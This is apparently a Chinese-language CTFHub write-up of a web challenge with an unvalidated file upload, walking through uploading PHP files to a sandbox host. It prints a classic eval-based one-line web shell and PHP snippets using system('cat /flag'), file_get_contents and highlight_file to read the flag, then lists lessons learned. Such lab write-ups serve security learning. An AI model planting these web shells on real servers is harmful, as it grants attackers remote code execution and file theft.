# CTFHub Writeup - 无验证

# 题目类型

WEB

# 题目描述

打开题目后，点开链接，页面出现一个大标题CTFHub 文件上传 - 无限制

在标题下面显示的正文内容为：Filename: 选择文件 未选择任何文件 Submit

# 解题过程

## 入坑过程：

#第一次踩坑：

首先我们需要新建一个文本文档，在里面写入这行php代码：

<?php @eval($_POST['cmd']);?>

然后将文件名改成shell.php

访问靶机链接，将文件进行上传

但我的页面却出现无法成功完成操作，因为文件包含病毒或者潜在的垃圾软件

## 第二次踩坑：

然后我再次进行更改将新建文档的php代码更改为：

<?php system("cat /flag");?>

然后将文件名再次改成shell.php，并进行上传

上传成功后，页面会自动给出相对路径：upload/shell.php

根据给出的路径，编出对应的地址http://challenge-2c2b7f4fe737d1d8.sandbox.ctfhub.com:10800/upload/shell.php，并且将它上传给浏览器，并进行访问

回车访问后发现此地址出现错误，页面为空白，无法进行刷新

我决定进行更改，用新的路径解决

## 新路径

在新建文档中重新上传php代码：

<?phpecho file_get_contents("/flag");?>

然后将文件名再次改成shell.php，并进行上传

上传成功后，页面会自动给出相对路径：upload/shell.php

根据给出的路径，编出对应的地址http://challenge-2c2b7f4fe737d1d8.sandbox.ctfhub.com:10800/upload/shell.php，并且将它上传给浏览器，并进行访问

回车访问，页面出现一串字母：

Warning: file_get_contents('/flag'): failed to open stream: No such file or directory in /var/www/html/upload/shell.php on line 2

这次我们找到了它的网站根目录

我尝试了两个不同的php代码发现都不安全:

<?php
readfile('../flag_2179625275.php');
?>

<?php
readfile('../flag_2179625275.php');
?>

所以我最后我使用了highlight_file，CTF里读PHP源码最稳的函数

新建文件文档上传新的php代码：

<?php
highlight_file('../flag_2179625275.php');
?>

然后将文件名再次改成shell.php，并进行上传

然后在浏览器中访问链接

http://challenge-2c2b7f4fe737d1d8.sandbox.ctfhub.com:10800/upload/shell.php

回车，页面显示出正确的flag

# 笔记

## 失败原因：

第一次：

eval($_POST['cmd'])是经典PHP一句话木马，**本地电脑的杀毒软件/Windows Defender实时扫描**，识别到这个代码是Web后门，直接拦截文件上传，提示“包含病毒或者潜在的垃圾软件”

第二次：

system("cat /flag");` 这个函数：是调用服务器系统命令输出内容。
但**很多PHP配置下，system执行的命令输出，不会直接打印回浏览器网页上**。
它在服务器后台执行了，但是浏览器页面拿不到输出，所以你看到一片空白，不是404，是PHP脚本正常跑了，但是没有把结果返回网页。

## 这道题我主要学习了：

1. **文件上传漏洞（无验证）核心原理**
这道是最简单的文件上传入门题：靶机**没有对上传文件的后缀、内容做任何校验**。我们可以直接上传`.php`文件，服务器会把它当成PHP代码解析执行。
> 重点：不是所有上传框都会过滤文件，无验证=直接上传php脚本就能拿到服务器执行权限。

2. **区分「本机杀毒拦截」和「网站靶机拦截」**
第一次踩坑让我明白：提示病毒不是靶机拒绝文件，是**本地电脑的杀毒软件识别一句话木马特征**，在上传提交前就拦截了。靶机本身不会检测文件内容。

3. **不同PHP函数输出特性不一样（非常关键）**
- `system()`：执行系统命令，但**不一定会把结果显示在浏览器网页**，服务器后台执行了，页面空白，刷新没用。
- `file_get_contents()`：读取文件并输出到网页，但**文件路径必须写对**，路径写错就会报`No such file or directory`找不到文件。
- `scandir()`：列出当前目录下所有文件，用来探测服务器目录，找flag真实位置。

4. **Linux文件路径的坑**
`/flag`代表**系统根目录下的flag文件**，但CTF靶机的flag不一定放在根目录。不能凭直觉写路径，要先探测目录结构，不能硬猜文件位置。

5. **CTF排错思维**
遇到空白页、报错不要反复刷新。先判断：
- 上传成功了吗？
- 代码有没有被服务器解析？
- 是代码输出问题，还是文件路径写错？
学会分步调试，而不是盲目重复操作。
